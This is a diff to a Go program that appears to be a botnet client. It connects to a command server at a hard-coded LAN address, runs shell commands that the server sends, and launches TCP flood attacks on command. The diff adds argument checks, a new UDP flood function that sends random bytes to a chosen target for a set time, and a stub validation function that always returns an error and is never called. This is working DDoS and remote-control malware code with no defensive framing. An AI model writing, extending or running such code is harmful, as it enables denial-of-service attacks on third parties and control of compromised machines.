@@ -2,6 +2,7 @@ package main
 
 import (
 	"crypto/rand"
+	"errors"
 	"fmt"
 	"net"
 	"os/exec"
@@ -12,7 +13,7 @@ import (
 
 func main() {
 	//Connect to the server
-	serverAddr := "127.0.0.1:8080"
+	serverAddr := "192.168.1.65:8080"
 	var conn net.Conn
 
 	for {
@@ -47,9 +48,19 @@ func main() {
 					switch parameters[0] {
 					case "tcp":
 						fmt.Println(parameters)
-						secs, _ := strconv.ParseUint(parameters[3], 10, 64)
-						size, _ := strconv.ParseUint(parameters[4], 10, 64)
-						tcp_attack(parameters[1], parameters[2], secs, size)
+
+						if len(parameters) < 5 {
+							continue
+						}
+						secs, err := strconv.ParseUint(parameters[3], 10, 64)
+						size, err := strconv.ParseUint(parameters[4], 10, 64)
+
+						if err != nil {
+							fmt.Println("Error executing command:", err)
+							continue
+						} else {
+							tcp_attack(parameters[1], parameters[2], secs, size)
+						}
 
 					default:
 						fmt.Println("Received from server:", receivedData)
@@ -84,8 +95,13 @@ func executeCommand(code string) (string, error) {
 	return string(output), nil
 }
 
+func validateAttackParameters([]string) error {
+	return errors.New("Something went wrong")
+}
+
 func tcp_attack(ip string, port string, secs uint64, size uint64) {
 	defer fmt.Printf("Attack on %v done\n", ip)
+
 	duration := time.Duration(secs) * time.Second // Set the desired duration (e.g., 5 seconds)
 	startTime := time.Now()                       // Get the current time
 	serverAddr := ip + ":" + port
@@ -120,4 +136,48 @@ func tcp_attack(ip string, port string, secs uint64, size uint64) {
 		}
 	}
 
+}
+
+func udp_attack(ip string, port string, secs uint64, size uint64) {
+	defer fmt.Printf("Attack on %v done\n", ip)
+
+	duration := time.Duration(secs) * time.Second // Set the desired duration (e.g., 5 seconds)
+	startTime := time.Now()                       // Get the current time
+	serverAddr := ip + ":" + port
+	fmt.Println(serverAddr)
+
+	// Run a loop for the specified duration
+	for time.Since(startTime) < duration {
+
+		// Resolve the UDP server address
+		udpAddr, err := net.ResolveUDPAddr("udp", serverAddr)
+
+		if err != nil {
+			fmt.Println("Error resolving address:", err)
+			return
+		}
+
+		conn, err := net.DialUDP("udp", nil, udpAddr)
+		if err != nil {
+			fmt.Println("Error:", err)
+			return
+		}
+		defer conn.Close()
+
+		for time.Since(startTime) < duration {
+			//Send random data bytes to the target
+			randomData := make([]byte, size)
+			_, err := rand.Read(randomData)
+
+			if err != nil {
+				fmt.Println("Error generating random data:", err)
+				return
+			}
+			_, err = conn.Write(randomData)
+			if err != nil {
+				fmt.Println("Error sending data:", err)
+				return
+			}
+		}
+	}
 }
